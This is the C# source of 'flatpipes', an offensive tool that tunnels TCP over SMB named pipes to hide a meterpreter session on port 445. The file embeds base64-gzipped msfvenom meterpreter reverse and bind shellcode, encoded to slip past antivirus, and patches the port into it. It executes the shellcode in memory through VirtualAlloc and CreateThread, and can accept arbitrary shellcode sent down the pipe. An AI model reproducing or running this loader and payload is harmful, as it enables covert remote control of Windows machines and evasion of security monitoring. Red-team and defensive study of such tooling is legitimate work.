﻿/// flatpipes v0.1
/// A TCP proxy over named pipes. Originally created for maintaining a meterpreter session over 445 for less network alarms. 
/// https://github.com/dxflatline/flatpipes
///
/// Copyright (C) 2017  Dixie Flatline (dc.flatline@gmail.com)
///
/// This program is free software: you can redistribute it and/or modify
/// it under the terms of the GNU General Public License as published by
/// the Free Software Foundation, either version 3 of the License, or
/// any later version.
/// This program is distributed in the hope that it will be useful,
/// but WITHOUT ANY WARRANTY; without even the implied warranty of
/// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
/// GNU General Public License for more details.
/// You should have received a copy of the GNU General Public License
/// along with this program.If not, see<http://www.gnu.org/licenses/>.
///
/// Major Changelog:
///   v0.1 - First release
///
/// Todo:
///   For customhex decide the client input method and encoding

using System;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Net.Sockets;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.IO.Compression;

namespace flatpipesns
{
    // Defines the data protocol for reading and writing strings on our stream
    public class StreamString
    {
        private Stream ioStream;
        private UnicodeEncoding streamEncoding;

        public StreamString(Stream ioStream)
        {
            this.ioStream = ioStream;
            streamEncoding = new UnicodeEncoding();
        }

        public string ReadString()
        {
            int len = 0;

            len = ioStream.ReadByte() * 256;
            len += ioStream.ReadByte();
            byte[] inBuffer = new byte[len];
            ioStream.Read(inBuffer, 0, len);

            return streamEncoding.GetString(inBuffer);
        }

        public int WriteString(string outString)
        {
            byte[] outBuffer = streamEncoding.GetBytes(outString);
            int len = outBuffer.Length;
            if (len > UInt16.MaxValue)
            {
                len = (int)UInt16.MaxValue;
            }
            ioStream.WriteByte((byte)(len / 256));
            ioStream.WriteByte((byte)(len & 255));
            ioStream.Write(outBuffer, 0, len);
            ioStream.Flush();

            return outBuffer.Length + 2;
        }
    }


    class flatpipes
    {
        static void Main(string[] args)
        {
            // HANLDE PARAMS
            if (args.Length<6)
            {
                Console.WriteLine("\nUsage: flatpipes [pipemode] [socketmode] [pipename] [pipeaddr] [ip] [port] [extension]\n");
                Console.WriteLine("  pipemode\tTo connect to or create locally a pipe (pserver|pclient)");
                Console.WriteLine("  socketmode\tAfter piping, TCP listen or connect (sserver|sclient)");
                Console.WriteLine("  pipeaddr\tIP for pipe connection (for local or server use '.')");
                Console.WriteLine("  pipename\tPrefix of the two pipes created");
                Console.WriteLine("  ip/port\tSocket info to listen on or connect to");
                Console.WriteLine("  extension\tMisc tools (revmeter|bindmeter|customhex)");
                Environment.Exit(1);
            }
            String pmode = args[0];
            String smode = args[1];
            String pipename = args[2];
            String pipeaddr = args[3];
            String ip = args[4];
            String port = args[5];
            String extension = null;
            if (args.Length == 7) extension = args[6];

            // PRINT ARCHITECTURE
            if (IntPtr.Size == 4) Console.WriteLine("[!] Running as 32-bit");
            else if (IntPtr.Size == 8) Console.WriteLine("[!] Running as 64-bit");
            else Console.WriteLine("[!] Running in the future");

            // PIPE SERVER IMPLEMENTATION
            if (String.Compare(pmode, "pserver") ==0)
            {
                // Handle pipes (block until connected)
                Console.WriteLine("[!] Waiting for pipe connections");
                var pipe_s2c = new NamedPipeServerStream(pipename + "_s2c", PipeDirection.Out); // Writing to client
                var pipe_c2s = new NamedPipeServerStream(pipename + "_c2s", PipeDirection.In); // Reading from client
                pipe_s2c.WaitForConnection();
                Console.WriteLine("[!] Client connected on downstream pipe");
                pipe_c2s.WaitForConnection();
                Console.WriteLine("[!] Client connected on upstream pipe");
                StreamString ss_s2c = new StreamString(pipe_s2c);
                StreamString ss_c2s = new StreamString(pipe_c2s);

                // Check for extensions execution
                IntPtr shellcodeProcessHandle = IntPtr.Zero;
                if (extension != null)
                {
                    if (String.Compare(extension, "revmeter") == 0 && String.Compare(smode, "sserver") == 0)
                    {
                        Console.WriteLine("[!] Extension " + extension + " starting.");
                        // We pass through encoding to minimize the AV catching popular staged meterpreter strings
                        // Shellcode formatted by msfvenom
                        // Below is: msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=54321 -f raw 2>/dev/null | gzip | base64 -w 0
                        String ShellCode_B64 = "H4sIADgM9VgAA/vzoomBgSGh86nhgZTuAIPuIJ7uIJHuIg3+7V5qhv/X2CTWMOkoHDzPy3j80aeg8O4ggW4vm24fwYrHHowXA7sjFRgvd3tKPLby7DbpZrwG1ABWavGg9Btz7Q/rWpXSJxHdESqMl9O6eby7I2SAqlm6GS90uqioREcnRkYF/n8QHx/VLfS6NzbD2IiBIaO82Cg+JMOnXI39/9UdExgZGDSPhARkaDZkM/y/msWaUc/AwJjBxHDFsPNZABA4AGHGK/77D/5fnZ4lEBaeMXNpSeL/q60HSrj++3GUvnmRCPRbFkMWC1CK6eaJ+P9Xm38w1Jl1m2U5ZDAIMDCEZTFkRCwJfvr/6uTgLIawYCRVtUoRGQwOIN0BGdz6/Ab/r4ZnlOb5Ak2Pi/vPo/Ky8P///4yHNY+VHj+8+8PWRUCTgv9fBQBn+JV+TQEAAA==";
                        // Decode base64
                        byte[] ShellCode_gzip = Convert.FromBase64String(ShellCode_B64);
                        // Decompress
                        byte[] ShellCode_c = Decompress(ShellCode_gzip);
                        // "Monkey patch" the port
                        string portHex = Convert.ToInt32(port).ToString("X").ToLower();
                        if (portHex.Length == 4)
                        {
                            ShellCode_c[181] = Convert.ToByte(portHex.Substring(0, 2), 16);
                            ShellCode_c[182] = Convert.ToByte(portHex.Substring(2, 2), 16);
                        }
                        else if (portHex.Length == 2)
                        {
                            ShellCode_c[181] = 0;
                            ShellCode_c[182] = Convert.ToByte(portHex.Substring(0, 2), 16);
                        }
                        // Execute payload and get returned handle
                        shellcodeProcessHandle = exec_shellcode(ShellCode_c);
                        //WaitForSingleObject(hThread, 0xFFFFFFFF);
                        //Console.WriteLine("[!] Extension " + extension + " 4");
                    }
                    else if (String.Compare(extension, "revmeter") == 0 && String.Compare(smode, "sclient") == 0)
                    {
                        Console.WriteLine("[*] Reverse payload on sclient config does not make sense. Use sserver instead.");
                        Environment.Exit(1);
                    }
                    else if (String.Compare(extension, "bindmeter") == 0 && String.Compare(smode, "sclient") == 0)
                    {
                        Console.WriteLine("[!] Extension " + extension + " starting.");
                        // We pass through encoding to minimize the AV catching popular staged meterpreter strings
                        // Shellcode formatted by msfvenom
                        // Below is: msfvenom --platform windows -p windows/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=54321 -f raw 2>/dev/null | gzip | base64 -w 0
                        String ShellCode_B64 = "H4sIAEoT9VgAA/vzoomBgSGh86nhgZTuAIPuIJ7uIJHuIg3+7V5qhv/X2CTWMOkoHDzPy3j80aeg8O4ggW4vm24fwYrHHowXA7sjFRgvd3tKPLby7DbpZrwG1ABWavGg9Btz7Q/rWpXSJxHdESqMl9O6eby7I2SAqlm6GS90uqioREcnRkYF/n8QHx/VLfS6NzbD2IiBIaO82Cg+JMOnXI39/9UdExgZGDSPhARkaDZkM/y/msUdGfDobxZjFlPGK/77D/5fnZ7BxHDFsPNZlkBYeMah2+bp/6+2HiiNCM/Y/tLi//+r4Rklb6wfAunpGaV5volAAxiyWIAqmW6eiP9/tfkHQ51ut1mWQwaDAANDWBZDRsSS4Kf/r04OzmIIC0ZWxc54WPNY6cvDAFPg4MorAQAA";
                        // Decode base64
                        byte[] ShellCode_gzip = Convert.FromBase64String(ShellCode_B64);
                        // Decompress
                        byte[] ShellCode_c = Decompress(ShellCode_gzip);
                        // "Monkey patch" the port
                        string portHex = Convert.ToInt32(port).ToString("X").ToLower();
                        if (portHex.Length == 4)
                        {
                            ShellCode_c[192] = Convert.ToByte(portHex.Substring(0, 2), 16);
                            ShellCode_c[193] = Convert.ToByte(portHex.Substring(2, 2), 16);
                        }
                        else if (portHex.Length == 2)
                        {
                            ShellCode_c[192] = 0;
                            ShellCode_c[193] = Convert.ToByte(portHex.Substring(0, 2), 16);
                        }
                        // Execute payload and get returned handle
                        shellcodeProcessHandle = exec_shellcode(ShellCode_c);
                        //WaitForSingleObject(hThread, 0xFFFFFFFF);
                        //Console.WriteLine("[!] Extension " + extension + " 4");
                    }
                    else if (String.Compare(extension, "bindmeter") == 0 && String.Compare(smode, "sserver") == 0)
                    {
                        Console.WriteLine("[*] Bind payload on sserver config does not make sense. Use sclient instead.");
                        Environment.Exit(1);
                    }
                    else if (String.Compare(extension, "customhex") == 0)
                    {
                        Console.WriteLine("[!] Extension " + extension + " starting. Waiting payload.");
                        String dataEncoded;
                        byte[] dataDecoded;
                        dataEncoded = ss_c2s.ReadString();
                        dataDecoded = Convert.FromBase64String(dataEncoded);
                        shellcodeProcessHandle = exec_shellcode(dataDecoded);
                    }
                }

                // Handle socket requirements
                NetworkStream networkStream = null;
                if (String.Compare(smode, "sclient") == 0)
                {
                    TcpClient tcpClient = null;
                    bool ok = false;
                    while (!ok)
                    {
                        try
                        {
                            tcpClient = new TcpClient(ip, Convert.ToInt32(port));
                            ok = true;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[*] Error while connecting. Trying again in a while..");
                            Task.Delay(1000).Wait();
                        }
                    }
                    networkStream = tcpClient.GetStream();
                    Console.WriteLine("[!] Connected to " + ip + ":" + port);
                }
                else if (String.Compare(smode, "sserver") == 0)
                {
                    TcpListener tcpServer = new TcpListener(IPAddress.Parse(ip), Convert.ToInt32(port));
                    // Try to start socket listener until no problem occurs
                    bool ok = false;
                    while (!ok)
                    {
                        try
                        {
                            tcpServer.Start();
                            ok = true;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[*] Error while listening. Check if port is used. Trying again in a while..");
                            Task.Delay(1000).Wait();
                        }
                    }
                    Console.WriteLine("[!] Started listener on " + ip + ":" + port);
                    TcpClient tcpClient = tcpServer.AcceptTcpClient();
                    Console.WriteLine("[!] Client Connected to socket");
                    networkStream = tcpClient.GetStream();
                }

                // Start the upstream/downstream handling tasks
                Server_SocketToWritePipe(networkStream, ss_s2c);
                Server_ReadPipeToSocket(networkStream, ss_c2s);

                if (shellcodeProcessHandle != IntPtr.Zero)
                {
                    Console.WriteLine("[!] Job done. Waiting until shellcode process exits.");
                    WaitForSingleObject(shellcodeProcessHandle, 0xFFFFFFFF);
                }
                else
                {
                    Console.WriteLine("[!] Job done. Waiting forever.");
                    while (true) { }
                }

            }

            // PIPE CLIENT IMPLEMENTATION
            else if (String.Compare(pmode, "pclient") == 0)
            {
                // Handle pipes
                // Even if pserver is not online, it will block until it opens (seems to wait forever)
                var pipe_s2c = new NamedPipeClientStream(pipeaddr, pipename + "_s2c", PipeDirection.In, PipeOptions.None); // Reading from server
                var pipe_c2s = new NamedPipeClientStream(pipeaddr, pipename + "_c2s", PipeDirection.Out, PipeOptions.None); // Writing to server
                pipe_s2c.Connect();
                Console.WriteLine("[!] Connected to server's downstream pipe");
                pipe_c2s.Connect();
                Console.WriteLine("[!] Connected to server's upstream pipe");
                StreamString ss_s2c = new StreamString(pipe_s2c);
                StreamString ss_c2s = new StreamString(pipe_c2s);

                // Check for extensions execution
                if (extension != null)
                {
                    if (String.Compare(extension, "revmeter") == 0)
                    {
                        Console.WriteLine("[*] Reverse payload on pclient does not make sense. Ignoring..");
                    }
                    else if (String.Compare(extension, "bindmeter") == 0)
                    {
                        Console.WriteLine("[*] Bind payload on pclient does not make sense. Ignoring..");
                    }
                    else if (String.Compare(extension, "customhex") == 0)
                    {
                        String ShellCode_pre = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x00";
                        byte[] shellcode_bytes = StringToByteArray(ShellCode_pre);
                        String ShellCode_enc = Convert.ToBase64String(shellcode_bytes, 0, shellcode_bytes.Length);
                        ss_c2s.WriteString(ShellCode_enc);
                    }

                }

                // Handle socket communication
                // Handle socket requirements
                NetworkStream networkStream = null;
                if (String.Compare(smode, "sclient") == 0)
                {
                    TcpClient tcpClient = null;
                    bool ok = false;
                    while (!ok)
                    {
                        try
                        {
                            tcpClient = new TcpClient(ip, Convert.ToInt32(port));
                            ok = true;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[*] Error while connecting. Trying again in a while..");
                            Task.Delay(1000).Wait();
                        }
                    }
                    networkStream = tcpClient.GetStream();
                    Console.WriteLine("[!] Connected to " + ip + ":" + port);
                }
                else if (String.Compare(smode, "sserver") == 0)
                {
                    TcpListener tcpServer = new TcpListener(IPAddress.Parse(ip), Convert.ToInt32(port));
                    // Try to start socket listener until no problem occurs
                    bool ok = false;
                    while (!ok)
                    {
                        try
                        {
                            tcpServer.Start();
                            ok = true;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[*] Error while listening. Check if port is used. Trying again in a while..");
                            Task.Delay(1000).Wait();
                        }
                    }
                    Console.WriteLine("[!] Started listener on " + ip + ":" + port);
                    TcpClient tcpClient = tcpServer.AcceptTcpClient();
                    Console.WriteLine("[!] Client Connected to socket");
                    networkStream = tcpClient.GetStream();
                }

                // Start the upstream/downstream handling tasks
                Client_ReadPipeToSocket(networkStream, ss_s2c);
                Client_SocketToWritePipe(networkStream, ss_c2s);

                // loop
                Console.WriteLine("[!] Job done. Waiting forever.");
                while (true) { }

            }
        }


        /// <summary> 
        /// Pipe server functions.
        /// From read pipe (c2s) to socket
        /// From socket to write pipe (s2c) 
        /// </summary>
        static void Client_ReadPipeToSocket(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
        {
            Task.Factory.StartNew(() =>
            {
                String dataEncoded;
                byte[] dataDecoded;
                while (true)
                {
                    dataEncoded = ss.ReadString();
                    dataDecoded = Convert.FromBase64String(dataEncoded);
                    if (dataDecoded.Length > 0)
                    {
                        Console.WriteLine("Client_ReadPipeToConsole: Encoded Length " + dataEncoded.Length);
                        Console.WriteLine("Client_ReadPipeToConsole: Decoded Length " + dataDecoded.Length);
                        networkStream.Write(dataDecoded, 0, dataDecoded.Length);
                    }
                }
            });
        }

        static void Client_SocketToWritePipe(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
        {
            Task.Factory.StartNew(() =>
            {
                byte[] netReadBuffer = new byte[1024];
                int charsread = 0;
                while (true)
                {
                    if (networkStream.CanRead)
                    {
                        charsread = networkStream.Read(netReadBuffer, 0, 250);
                        String s = Convert.ToBase64String(netReadBuffer, 0, charsread);
                        if (charsread > 0)
                        {
                            Console.WriteLine("Client_SocketToWritePipe: Decoded Length " + charsread);
                            Console.WriteLine("Client_SocketToWritePipe: Encoded Length " + s.Length);
                            ss.WriteString(s);
                        }
                    }
                }
            });
        }


        /// <summary> 
        /// Pipe client functions.
        /// From read pipe (s2c) to socket
        /// From socket to write pipe (c2s) 
        /// </summary>
        static void Server_ReadPipeToSocket(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
        {
            Task.Factory.StartNew(() =>
            {
                String dataEncoded;
                byte[] dataDecoded;
                while (true)
                {
                    dataEncoded = ss.ReadString();
                    dataDecoded = Convert.FromBase64String(dataEncoded);
                    if (dataDecoded.Length > 0)
                    { 
                        Console.WriteLine("Server_PipeToSocket: Encoded Length " + dataEncoded.Length);
                        Console.WriteLine("Server_PipeToSocket: Decoded Length " + dataDecoded.Length);
                        networkStream.Write(dataDecoded, 0, dataDecoded.Length);
                    }
                }

            });
        }

        static void Server_SocketToWritePipe(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
        {
            Task.Factory.StartNew(() =>
            {
                byte[] netReadBuffer = new byte[1024];
                int charsread = 0;
                while (true)
                {
                    if (networkStream.CanRead)
                    {
                        charsread = networkStream.Read(netReadBuffer, 0, 250);
                        String s = Convert.ToBase64String(netReadBuffer, 0, charsread);
                        if (charsread > 0)
                        {
                            Console.WriteLine("Server_SocketToWritePipe: Decoded Length " + charsread);
                            Console.WriteLine("Server_SocketToWritePipe: Encoded Length " + s.Length);
                            ss.WriteString(s);
                        }
                    }

                }
            });
        }



        /// <summary> 
        /// Helper: Gets a hex string (\xfc\xcb\x04) and explode to byte[]
        /// </summary>
        private static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length / 4;
            byte[] bytes = new byte[NumberChars];
            for (int i = 0; i < NumberChars; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring((i * 4) + 2, 2), 16);
            }
            return bytes;
        }

        /// <summary> 
        /// Decompress: Decompress a gzip byte[]
        /// </summary>
        static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                zipStream.CopyTo(resultStream);
                return resultStream.ToArray();
            }
        }


        /// <summary> 
        /// Helper: Kernel32 imports for bytecode execution
        /// </summary>
        private static IntPtr exec_shellcode(byte[] shellcode)
        {
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            return hThread;
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
         UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
        );
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );

    }
}

